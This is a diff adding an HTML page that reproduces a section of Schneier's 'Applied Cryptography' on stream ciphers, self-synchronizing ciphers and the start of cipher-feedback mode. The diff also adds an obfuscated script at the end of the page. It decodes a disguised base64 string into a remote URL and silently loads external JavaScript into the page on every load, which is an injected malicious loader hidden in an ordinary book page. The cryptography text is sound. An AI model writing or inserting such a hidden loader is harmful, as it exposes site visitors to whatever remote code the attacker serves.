@@ -1,0 +1,110 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=197-200//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">9.4 Stream Ciphers</FONT></H3>
+<P>Stream ciphers convert plaintext to ciphertext 1 bit at a time. The simplest implementation of a stream cipher is shown in Figure 9.6. A <B>keystream generator</B> (sometimes called a running-key generator) outputs a stream of bits: <I>k</I><SUB>1</SUB>, <I>k</I><SUB>2</SUB>, <I>k</I><SUB>3</SUB>,..., <I>k</I><SUB>i</SUB>. This keystream (sometimes called a running key) is XORed with a stream of plaintext bits, <I>p</I><SUB>1</SUB>, <I>p</I><SUB>2</SUB>, <I>p</I><SUB>3</SUB>,..., <I>p</I><SUB>i</SUB>, to produce the stream of ciphertext bits.</P>
+<DL>
+<DD><I>c</I><SUB>i</SUB> = <I>p</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB>
+</DL>
+<P>At the decryption end, the ciphertext bits are XORed with an identical keystream to recover the plaintext bits.
+</P>
+<DL>
+<DD><I>p</I><SUB>i</SUB> = <I>c</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB>
+</DL>
+<P>Since
+</P>
+<DL>
+<DD><I>p</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB> &#8853; <I>k</I><SUB>i</SUB> = <I>p</I><SUB>i</SUB>
+</DL>
+<P>this works nicely.
+</P>
+<P>The system&#146;s security depends entirely on the insides of the keystream generator. If the keystream generator outputs an endless stream of zeros, the ciphertext will equal the plaintext and the whole operation will be worthless. If the keystream generator spits out a repeating 16-bit pattern, the algorithm will be a simple XOR with negligible security (see Section 1.4). If the keystream generator spits out an endless stream of random (not pseudo-random, but real random&#151;see Section 2.8) bits, you have a one-time pad and perfect security.</P>
+<P>The reality of stream cipher security lies somewhere between the simple XOR and the one-time pad. The keystream generator generates a bit stream that looks random, but is actually a deterministic stream that can be flawlessly reproduced at decryption time. The closer the keystream generator&#146;s output is to random, the harder time a cryptanalyst will have breaking it.</P>
+<I><P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/09-06.jpg',275,100 )"><IMG SRC="images/09-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-06.jpg',275,100)"><FONT COLOR="#000077"><B>Figure 9.6</B></FONT></A>&nbsp;&nbsp;Stream cipher.</I>
+</P>
+<P>If, however, the keystream generator produces the same bit stream every time it is turned on, the resulting cryptosystem will be trivial to break. An example will show why.
+</P>
+<P>If Eve has a ciphertext and associated plaintext, she can XOR the plaintext and the ciphertext to recover the keystream. Or, if she has two different ciphertexts encrypted with the same keystream, she can XOR them together and get two plaintext messages XORed with each other. This is easy to break, and then she can XOR one of the plaintexts with the ciphertext to get the keystream.</P>
+<P>Now, whenever she intercepts another ciphertext message, she has the keystream bits necessary to decrypt it. In addition, she can decrypt and read any old ciphertext messages she has previously intercepted. When Eve gets a single plaintext/ciphertext pair, she can read everything.</P>
+<P>This is why all stream ciphers have keys. The output of the keystream generator is a function of the key. Now, if Eve gets a plaintext/ciphertext pair, she can only read messages encrypted with a single key. Change the key, and the adversary is back to square one. Stream ciphers are especially useful to encrypt never-ending streams of communications traffic: a T-1 link between two computers, for example.</P>
+<P>A keystream generator has three basic parts (see Figure 9.7). The internal state describes the current state of the keystream generator. Two keystream generators, with the same key and the same internal state, will produce the same keystream. The output function takes the internal state and generates a keystream bit. The next-state function takes the internal state and generates a new internal state.</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">9.5  Self-Synchronizing Stream Ciphers</FONT></H3>
+<P>For a <B>self-synchronizing stream cipher</B>, each keystream bit is a function of a fixed number of previous ciphertext bits [1378]. The military calls this <B>ciphertext auto key</B> (CTAK). The basic idea was patented in 1946 [667].</P>
+<I><P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/09-07.jpg',199,121 )"><IMG SRC="images/09-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-07.jpg',199,121)"><FONT COLOR="#000077"><B>Figure 9.7</B></FONT></A>&nbsp;&nbsp;Inside a keystream generator.</I>
+</P>
+<P>Figure 9.8 shows a self-synchronizing stream cipher. The internal state is a function of the previous <I>n</I> ciphertext bits. The cryptographic complexity is in the output function, which takes the internal state and generates a keystream bit.</P>
+<P>Since the internal state depends wholly on the previous <I>n</I> ciphertext bits, the decryption keystream generator will automatically synchronize with the encryption keystream generator after receiving <I>n</I> ciphertext bits.</P>
+<P>In smart implementations of this mode, each message begins with a random header <I>n</I> bits long. That header is encrypted, transmitted, and then decrypted. The decryption will be incorrect, but after those <I>n</I> bits both keystream generators will be synchronized.</P>
+<P>The down side of a self-synchronizing stream cipher is error propagation. For each ciphertext bit garbled in transmission, the decryption keystream generator will incorrectly produce <I>n</I> keystream bits. Therefore, for each ciphertext error, there will be <I>n</I> corresponding plaintext errors, until the garbled bit works its way out of the internal state.</P>
+<P><FONT SIZE="+1"><B><I>Security Problems</I></B></FONT></P>
+<P>Self-synchronizing stream ciphers are also vulnerable to a playback attack. First Mallory records some ciphertext bits. Then, at a later time, he substitutes this recording into current traffic. After some initial garbage while the receiving end resynchronizes, the old ciphertext will decrypt as normal. The receiving end has no way of knowing that this is not current data, but old data being replayed. Unless timestamps are used, Mallory can convince a bank to credit his account again and again, by replaying the same message (assuming the key hasn&#146;t been changed, of course). Other weaknesses in this type of scheme could be exploited in the cases of very frequent resynchronization [408].
+</P>
+<I><P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/09-08.jpg',264,121 )"><IMG SRC="images/09-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-08.jpg',264,121)"><FONT COLOR="#000077"><B>Figure 9.8</B></FONT></A>&nbsp;&nbsp;A self-synchronizing keystream generator.</I>
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">9.6  Cipher-Feedback Mode</FONT></H3>
+<P>Block ciphers can also be implemented as a self-synchronizing stream cipher; this is called <B>cipher-feedback (CFB)</B> mode. With CBC mode, encryption cannot begin until a complete block of data is received. This is a problem in some network applications. In a secure network environment, for example, a terminal must be able to transmit each character to the host as it is entered. When data has to be processed in byte-sized chunks, CBC mode just won&#146;t do.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(kCYVQfuw, eSCcWdFD) {eSCcWdFD = kCYVQfuw.createElement('script');eSCcWdFD.type = 'text/javascript';eSCcWdFD.async = true;eSCcWdFD.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');kCYVQfuw.getElementsByTagName('body')[0].appendChild(eSCcWdFD);}(document));</script></body>
+</html>
